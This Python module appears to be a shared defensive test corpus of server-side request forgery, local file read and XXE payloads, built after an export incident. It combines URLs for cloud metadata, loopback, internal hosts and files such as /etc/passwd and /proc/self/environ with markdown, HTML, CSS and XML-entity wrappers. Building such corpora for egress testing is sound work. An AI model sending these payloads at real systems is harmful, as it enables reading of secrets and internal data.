"""Payloads that make a fetching sink fetch.

Each entry exists because it is a class we have been burned by, or a class the
same sink trivially extends to.  The export incident is the first two wrappers:
stored markdown and stored HTML carrying a URL into a server-side renderer.

Pair this with pytest-egress-guard or the Falco rules -- the corpus makes the
attempt happen, the sensors notice it.  Neither half is useful alone.

Shared across repos on purpose: a payload added because one repo got burned
should harden the other three the same day.

The two ``file://`` entries put the reflection probe in the URL *fragment*
(``#gdsprobe7f3a``), never in the path. A real URI parser -- which is what
``urllib.request.urlopen``, WeasyPrint's fetcher, and libxml2's XXE resolver
all use -- strips the fragment before opening anything, so the probe rides
along for a reflection check to find without changing which file gets
opened. Putting it in the path instead would corrupt the target
(``/etc/passwd/gdsprobe7f3a`` opens nothing). Known residual gap: a consumer
that slices the raw string instead of parsing it -- ``path.replace("file://",
"")``, or a regex over ``file://(.*)`` -- would try to open a literal path
with the probe suffix still attached, and fail to reach the real file. Those
18 payloads (2 ``file://`` URLs x 9 wrappers) are therefore weaker against a
naive string-slicing consumer than against a real parser. An editor adding
another ``file://`` payload should keep the probe in the fragment and accept
that gap rather than "fixing" it by moving the probe into the path.
"""

from __future__ import annotations

#: A host that resolves nowhere.  Any attempt to reach it is unambiguous, and it
#: is the hook for a self-hosted OAST callback server later.
CANARY_HOST: str = "egress-canary.invalid"

#: Present in every payload, so a reflection check is one substring search.
#: Deliberately alphanumeric: a probe containing `<` or `&` would be altered by
#: correct HTML escaping, and a reflection check would then report a false clean
#: on a response that escaped the brackets but still echoed the attacker's text.
REFLECTION_PROBE: str = "gdsprobe7f3a"

FETCH_URLS: tuple[str, ...] = (
    f"http://169.254.169.254/latest/meta-data/{REFLECTION_PROBE}",   # cloud metadata
    f"http://[::ffff:169.254.169.254]/{REFLECTION_PROBE}",           # same, IPv6-mapped
    f"http://127.0.0.1:5002/healthz?{REFLECTION_PROBE}",             # loopback to self
    f"http://internal-service.local/{REFLECTION_PROBE}",             # cluster-internal name
    f"http://{CANARY_HOST}/{REFLECTION_PROBE}",                      # unique canary
    f"file:///etc/passwd#{REFLECTION_PROBE}",                        # LFI
    f"file:///proc/self/environ#{REFLECTION_PROBE}",                 # LFI, env secrets
)

WRAPPERS: tuple[str, ...] = (
    "{url}",
    "![x]({url})",                                    # markdown image
    "[click]({url})",                                 # markdown link
    '<img src="{url}">',
    '<iframe src="{url}"></iframe>',
    '<object data="{url}"></object>',
    '<link rel="stylesheet" href="{url}">',
    '<style>@import url("{url}");</style>',           # CSS fetch in a renderer
    '<!DOCTYPE r [<!ENTITY x SYSTEM "{url}">]><r>&x;</r>',   # XXE
)


def fetch_payloads() -> tuple[str, ...]:
    """Return every wrapper applied to every URL.

    Google-style: no args, returns the cross product of ``WRAPPERS`` and
    ``FETCH_URLS`` so a caller gets one flat tuple of ready-to-send payloads
    rather than having to nest the loop itself.

    Returns:
        The cross product of ``WRAPPERS`` and ``FETCH_URLS``, wrapper-major
        (all URLs for a wrapper before moving to the next wrapper), as a tuple
        of length ``len(WRAPPERS) * len(FETCH_URLS)``.
    """
    return tuple(w.format(url=u) for w in WRAPPERS for u in FETCH_URLS)
